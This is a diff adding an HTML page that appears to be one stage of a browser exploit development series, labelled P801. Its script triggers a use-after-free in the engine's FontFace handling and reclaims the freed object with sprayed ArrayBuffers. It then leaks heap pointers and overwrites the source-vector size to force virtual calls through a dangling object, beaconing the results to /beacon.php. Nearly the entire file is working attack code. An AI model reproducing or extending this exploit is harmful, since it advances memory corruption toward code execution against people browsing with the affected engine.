@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P801 — Forced continuation writes</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P801 — Forced Continuation Writes
+ *
+ * P800 confirmed the binary oracle works but engine writes ONLY
+ * q0/q11/q12/q13. The oracle cannot extract actual pointer values.
+ *
+ * KEY INSIGHT: q12 = 0 means m_sources.size = 0. The engine sees
+ * an empty source vector and stops iterating. If we set q12 = 1,
+ * the engine would try to iterate source[0] = q13 (real
+ * CSSFontFaceSource with real vtable!). Its virtual functions
+ * read through m_face → our AB, and might WRITE data back
+ * (font metrics, status, possibly code pointers).
+ *
+ * PHASES (localStorage rotation):
+ *   A: Baseline — dump AB at 500ms, 2000ms, 5000ms for delayed writes
+ *   B: face1.status — access FontFace after UAF, check re-access
+ *   C: q12=1 inject — set m_size=1, force layout, dump changes
+ *   D: q12=1 + face1.loaded — inject + promise re-check
+ *
+ * CRASH_CLASS: HIGH — dangling pointer + forced vtable dispatch
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P801-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P801-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+var PHASES = ['A','B','C','D'];
+
+function getPhase(){
+  try { return localStorage.getItem('p801_phase') || 'A'; } catch(e){ return 'A'; }
+}
+function setPhase(p){
+  try { localStorage.setItem('p801_phase', p); } catch(e){}
+}
+
+function dumpAB(label, view){
+  var nz = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== 0n) nz.push('q' + q + '=0x' + h16(view[q]));
+  }
+  b(label, nz.join('|').slice(0, 700));
+  log(label + ': ' + (nz.length > 0 ? nz.join(' ') : '(all zero)'));
+  return nz;
+}
+
+function rawDump(label, view){
+  var raw = '';
+  for (var q = 0; q < 12; q++) raw += h16(view[q]);
+  b(label + '-R1', raw);
+  raw = '';
+  for (var q = 12; q < 24; q++) raw += h16(view[q]);
+  b(label + '-R2', raw);
+}
+
+/* Keep face1 accessible outside setTimeout */
+var face1_ref = null;
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  var phase = getPhase();
+  var idx = PHASES.indexOf(phase);
+  if (idx < 0 || idx >= PHASES.length){
+    b('DONE', 'all_phases_complete');
+    log('All phases complete!');
+    try { localStorage.removeItem('p801_phase'); } catch(e){}
+    return;
+  }
+
+  var nextPhase = (idx + 1 < PHASES.length) ? PHASES[idx + 1] : 'DONE';
+  setPhase(nextPhase);
+
+  b('BOOT', 'phase=' + phase);
+  log('P801 — Phase ' + phase + '\n');
+
+  /* ===== PASS 1: standard UAF ===== */
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:ws1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('wf1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  face1_ref = face1;
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em wf1, ws1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(phase + '-P1-MISS', 'no_reclaim');
+      log('P1 MISS, retrying...');
+      setPhase(phase);
+      setTimeout(function(){ location.reload(); }, 800);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+    var self1 = q11_1 - 0x68n;
+
+    b(phase + '-P1', 'self=0x' + h16(self1) + '|q13=0x' + h16(q13_1));
+    log('P1: self=0x' + h16(self1) + ' q13=0x' + h16(q13_1));
+
+    /* Baseline dump */
+    var base0 = dumpAB(phase + '-BASE', view1);
+    rawDump(phase + '-BASE', view1);
+
+    /* ===== PHASE-SPECIFIC ACTIONS ===== */
+
+    if (phase === 'A') {
+      /* Phase A: just watch for delayed writes over time */
+      log('\nPhase A: watching for delayed engine writes...');
+
+      setTimeout(function(){
+        dumpAB(phase + '-T2000', view1);
+      }, 1500);
+
+      setTimeout(function(){
+        dumpAB(phase + '-T5000', view1);
+      }, 4500);
+
+      setTimeout(function(){
+        dumpAB(phase + '-T10000', view1);
+        log('\nPhase A complete.');
+        setTimeout(function(){ location.reload(); }, 1000);
+      }, 9500);
+
+    } else if (phase === 'B') {
+      /* Phase B: access face1 properties via dangling pointer */
+      log('\nPhase B: accessing face1 properties...');
+
+      var status1 = 'unknown';
+      try { status1 = face1_ref.status; } catch(e){ status1 = 'ERR:' + e.message; }
+      b(phase + '-STATUS', status1);
+      log('face1.status = ' + status1);
+
+      /* Check if AB changed */
+      dumpAB(phase + '-POST-STATUS', view1);
+
+      /* Try face1.family */
+      var fam1 = 'unknown';
+      try { fam1 = face1_ref.family; } catch(e){ fam1 = 'ERR:' + e.message; }
+      b(phase + '-FAMILY', fam1);
+      log('face1.family = ' + fam1);
+
+      dumpAB(phase + '-POST-FAMILY', view1);
+
+      /* Try accessing face1.loaded promise */
+      try {
+        face1_ref.loaded.then(function(f){
+          b(phase + '-LOADED-OK', 'resolved');
+          dumpAB(phase + '-POST-LOADED', view1);
+        }, function(e){
+          b(phase + '-LOADED-ERR', e && e.message);
+          dumpAB(phase + '-POST-LOADED', view1);
+        });
+      } catch(e){
+        b(phase + '-LOADED-CATCH', e.message);
+      }
+
+      setTimeout(function(){
+        dumpAB(phase + '-T3000', view1);
+        log('\nPhase B complete.');
+        setTimeout(function(){ location.reload(); }, 1000);
+      }, 2500);
+
+    } else if (phase === 'C') {
+      /* Phase C: inject m_size = 1 into the source vector */
+      log('\nPhase C: injecting q12=1 (m_sources.size)...');
+
+      /* Save original values */
+      var orig_q12 = view1[12];
+      b(phase + '-ORIG-Q12', '0x' + h16(orig_q12));
+
+      /* Inject size = 1 */
+      view1[12] = 1n;
+      b(phase + '-INJECT', 'q12=1');
+      log('Injected q12 = 1');
+
+      /* Force layout to trigger font re-access */
+      var span = document.createElement('span');
+      span.style.fontFamily = 'wf1, serif';
+      span.style.fontSize = '48px';
+      span.textContent = 'A';
+      document.body.appendChild(span);
+
+      try { document.body.offsetHeight; } catch(e){}
+      b(phase + '-LAYOUT', 'forced');
+
+      /* Check AB after layout */
+      setTimeout(function(){
+        dumpAB(phase + '-POST-LAYOUT', view1);
+        rawDump(phase + '-POST-LAYOUT', view1);
+
+        /* Also try fonts.check */
+        try { document.fonts.check('1em wf1'); } catch(e){}
+        b(phase + '-CHECK', 'called');
+
+        setTimeout(function(){
+          dumpAB(phase + '-T2000', view1);
+          rawDump(phase + '-T2000', view1);
+          log('\nPhase C complete.');
+          setTimeout(function(){ location.reload(); }, 1000);
+        }, 1500);
+      }, 500);
+
+    } else if (phase === 'D') {
+      /* Phase D: inject m_size=1 + trigger face1.loaded */
+      log('\nPhase D: inject q12=1 + face1.loaded...');
+
+      view1[12] = 1n;
+      b(phase + '-INJECT', 'q12=1');
+
+      /* Access loaded promise — might trigger re-resolution */
+      try {
+        var p = face1_ref.loaded;
+        b(phase + '-PROMISE', 'got_promise');
+
+        p.then(function(f){
+          b(phase + '-THEN-OK', 'resolved');
+          dumpAB(phase + '-POST-THEN', view1);
+          rawDump(phase + '-POST-THEN', view1);
+        }, function(e){
+          b(phase + '-THEN-ERR', e && e.message);
+          dumpAB(phase + '-POST-THEN', view1);
+          rawDump(phase + '-POST-THEN', view1);
+        });
+      } catch(e){
+        b(phase + '-PROMISE-ERR', e.message);
+      }
+
+      /* Also try: re-add a font face using the same family */
+      try {
+        var face2 = new FontFace('wf1', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+        document.fonts.add(face2);
+        void face2.loaded;
+        b(phase + '-READD', 'face2_added');
+      } catch(e){
+        b(phase + '-READD-ERR', e.message);
+      }
+
+      setTimeout(function(){
+        dumpAB(phase + '-T3000', view1);
+        rawDump(phase + '-T3000', view1);
+        log('\nPhase D complete.');
+        setTimeout(function(){ location.reload(); }, 1000);
+      }, 2500);
+    }
+
+  }, 500);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P801 — Forced continuation writes — Loading...</pre>
+</body>
+</html>
